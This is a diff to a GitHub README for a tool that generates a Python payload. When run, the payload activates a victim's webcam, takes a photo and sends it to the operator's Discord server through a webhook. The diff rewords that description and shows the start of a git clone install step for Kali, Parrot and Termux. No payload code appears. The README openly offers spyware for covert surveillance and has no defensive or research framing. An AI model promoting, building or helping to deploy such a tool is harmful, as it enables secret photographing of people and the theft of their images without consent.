@@ -3,7 +3,7 @@
 <img src="https://github.com/0xbitx/DEDSEC_ASHLEY_LOOK_AT_ME/blob/main/banner.png", width="600", height="600">
 </p>
 <h1 align="center"> DEDSEC_ASHLEY_LOOK_AT_ME</h1>
-<h4 align="center"> DEDSEC_ASHLEY_LOOK_AT_ME is a camera dumper tool that create a python payload which, when activated, capture a photo and send to your discord server via webhook.</h4>
+<h4 align="center"> DEDSEC_ASHLEY_LOOK_AT_ME is a linux based camera dumper that creates a python payload which, when activated, activate the webcam and take a photo and send to your discord server via webhook.</h4>
 
 ### INSTALLATION [KALI - PARROT - TERMUX]
 * git clone https://github.com/0xbitx/DEDSEC_ASHLEY_LOOK_AT_ME.git
